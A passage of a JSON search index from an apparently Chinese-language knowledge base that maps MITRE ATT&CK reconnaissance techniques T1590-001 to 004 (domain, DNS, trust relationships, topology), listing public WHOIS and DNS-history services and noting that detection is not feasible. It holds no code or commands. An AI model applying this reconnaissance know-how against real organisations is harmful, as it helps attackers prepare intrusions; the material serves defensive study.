<p>https://attack.mitre.org/techniques/T1589/003/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/","title":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u57df\u5c5e\u6027","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u57df\u7684\u4fe1\u606f\u3002\u6709\u5173\u57df\u53ca\u5176\u5c5e\u6027\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u57df\u4ee5\u53ca\u7ba1\u7406\u6570\u636e\uff08\u4f8b\u5982\uff1a\u59d3\u540d\uff0c\u6ce8\u518c\u5546\u7b49\uff09\u4ee5\u53ca\u66f4\u76f4\u63a5\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u4f8b\u5982\u8054\u7cfb\u4eba\uff08\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u7535\u8bdd\uff09\uff0c\u516c\u53f8\u5730\u5740\u548c\u540d\u79f0\u670d\u52a1\u5668\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u76f4\u63a5\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\u76d1\u542c\u7aef\u53e3\uff0c\u670d\u52a1\u5668banner\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\uff0c\u9493\u9c7c\u8fdb\u884c\u6536\u96c6\u3002\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1aWHOIS\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Whois \u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u4e00\u4e2a\u7528\u6765\u67e5\u8be2\u57df\u540d\u662f\u5426\u5df2\u7ecf\u88ab\u6ce8\u518c\uff0c\u4ee5\u53ca\u6ce8\u518c\u57df\u540d\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u6570\u636e\u5e93\uff08\u5982\u57df\u540d\u6240\u6709\u4eba\u3001\u57df\u540d\u6ce8\u518c\u5546\u3001\u57df\u540d\u6ce8\u518c\u65e5\u671f\u548c\u8fc7\u671f\u65e5\u671f\u3001DNS\u7b49\uff09\u3002\u901a\u8fc7\u57df\u540dWhois\u670d\u52a1\u5668\u67e5\u8be2\uff0c\u53ef\u4ee5\u67e5\u8be2\u57df\u540d\u5f52\u5c5e\u8005\u8054\u7cfb\u65b9\u5f0f\uff0c\u4ee5\u53ca\u6ce8\u518c\u548c\u5230\u671f\u65f6\u95f4\u3002</p> <ul> <li>Kali\u4e0bwhois\u67e5\u8be2</li> <li>\u57df\u540dWhois\u67e5\u8be2 - \u7ad9\u957f\u4e4b\u5bb6</li> <li>Whois \u7231\u7ad9</li> <li>ip138</li> <li>Whois Lookup</li> <li>ICANN Lookup</li> <li>\u57df\u540d\u4fe1\u606f\u67e5\u8be2 - \u817e\u8baf\u4e91</li> <li>nicolasbouliane</li> <li>\u65b0\u7f51 whois\u4fe1\u606f\u67e5\u8be2</li> <li>IP WHOIS\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177</li> <li>\u5fae\u6b65\u5728\u7ebf</li> <li>\u5947\u5b89\u4fe1\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0</li> <li>...</li> </ul>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590-001</p> <p>https://attack.mitre.org/techniques/T1590/001/</p> <p>\u6536\u96c6\u57df\u540d\u4fe1\u606f.\u767d\u5e3d\u4e0e\u5b89\u5168</p> <p>https://www.kancloud.cn/noahs/src_hacker/2119907</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/","title":"T1590-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-DNS","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005DNS\u7684\u4fe1\u606f\u3002DNS\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u6ce8\u518c\u7684\u540d\u79f0\u670d\u52a1\u5668\u4ee5\u53ca\u6982\u8ff0\u76ee\u6807\u5b50\u57df\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u548c\u5176\u4ed6\u4e3b\u673a\u7684\u5730\u5740\u7684\u8bb0\u5f55\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7DNS/Passive DNS\u67e5\u8be2\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6536\u96c6\u8be6\u7ec6\u4fe1\u606f\u3002\u51ed\u8bc1\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u4e3b\u52a8\u626b\u63cf\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>dnsdb: \u5168\u7403DNS\u641c\u7d22\u5f15\u64ce</p> <p>viewdns.info: \u4ee4\u7ad9\u957f\u5341\u5206\u86cb\u75bc\u7684DNS\u5386\u53f2\u8bb0\u5f55\u7f51\u7ad9\uff0c\u8bb0\u5f55\u4e86\u51e0\u5e74\u5185\u7684\u66f4\u6539\u8bb0\u5f55\u3002</p> <p>securitytrails.com: \u5e9e\u5927\u7684DNS\u5386\u53f2\u6570\u636e\u5e93\uff0c\u6211\u8bd5\u4e86\u4e0b\u53ef\u4ee5\u67e5\u51fa\u51e0\u5e74\u5185\u7f51\u7ad9\u7528\u8fc7\u7684IP\u3001\u673a\u623f\u4fe1\u606f\u7b49\uff0c\u975e\u5e38\u53ef\u6015\u3002</p> <p>\u5728\u7ebf\u7f51\u7ad9\u67e5\u8be2</p> <ul> <li>dnsdb</li> <li>NETCRAFT</li> <li>viewdns</li> <li>threatbook</li> <li>securitytrails</li> </ul>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-DNS/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590-002</p> <p>https://attack.mitre.org/techniques/T1590/002/</p> <p>DNS\u5386\u53f2\u89e3\u6790.\u767d\u5e3d\u4e0e\u5b89\u5168</p> <p>https://www.kancloud.cn/noahs/src_hacker/2120650</p> <p>\u6e17\u900f\u6d4b\u8bd5\u4e4b\u4fe1\u606f\u6536\u96c6DNS\u7bc7</p> <p>https://blog.csdn.net/qq1124794084/article/details/78672225</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/","title":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u4efb\u5173\u7cfb\u7684\u4fe1\u606f\u3002\u6709\u5173\u7f51\u7edc\u4fe1\u4efb\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5df2\u8fde\u63a5\uff08\u5e76\u53ef\u80fd\u63d0\u5347\u4e86\u7684\uff09\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u7684\u7b2c\u4e8c\u6216\u7b2c\u4e09\u65b9\u7ec4\u7ec7/\u57df\uff08\u4f8b\u5982\uff1a\u6258\u7ba1\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u627f\u5305\u5546\u7b49\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u6536\u96c6\u3002\u6709\u5173\u7f51\u7edc\u4fe1\u4efb\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\uff0c\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4fe1\u4efb\u5173\u7cfb\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u7b80\u5355\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u6bd4\u5982\u4e00\u4e9b\u7279\u6b8a\u884c\u4e1a\uff0c\u822a\u7a7a\u3001\u91d1\u878d\u3001\u8fd0\u8425\u5546\uff0c\u548c\u5206\u516c\u53f8\u6216\u8005\u7b2c\u4e09\u65b9\u516c\u53f8\u4e4b\u95f4\u90fd\u662f\u4e13\u7ebf\uff0c\u901a\u8fc7\u653b\u51fb\u5206\u516c\u53f8\u3001\u7b2c\u4e09\u65b9\u516c\u53f8\uff0c\u83b7\u53d6\u6743\u9650\uff0c\u8d70\u4e13\u7ebf\u7f51\u7edc\u8fdb\u5165\u53d7\u5bb3\u8005\u7f51\u7edc\u5185\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590-003</p> <p>https://attack.mitre.org/techniques/T1590/003/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/","title":"T1590-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u62d3\u6251","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u62d3\u6251\u7684\u4fe1\u606f\u3002\u7f51\u7edc\u62d3\u6251\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\uff0c\u5305\u62ec\u9762\u5411\u5916\u90e8\u548c\u5185\u90e8\u7f51\u7edc\u73af\u5883\u7684\u7269\u7406\u6216\u903b\u8f91\u5e03\u7f6e\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u8fd8\u5305\u62ec\u6709\u5173\u7f51\u7edc\u8bbe\u5907\uff08\u7f51\u5173\uff0c\u8def\u7531\u5668\u7b49\uff09\u548c\u5176\u4ed6\u57fa\u7840\u7ed3\u6784\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u3002\u7f51\u7edc\u62d3\u6251\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5728\u5185\u7f51\u8fdb\u884c\u7f51\u7edc\u62d3\u6251\u4fe1\u606f\u6536\u96c6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u5bf9\u4e8e\u5728\u5916\u7f51\u8fdb\u884c\u6536\u96c6\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c37\u6b4c\u8bed\u6cd5\u3001\u7f51\u76d8\u68c0\u7d22\u3001QQ\u7fa4\u7b49\u65b9\u6cd5\u6536\u96c6\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD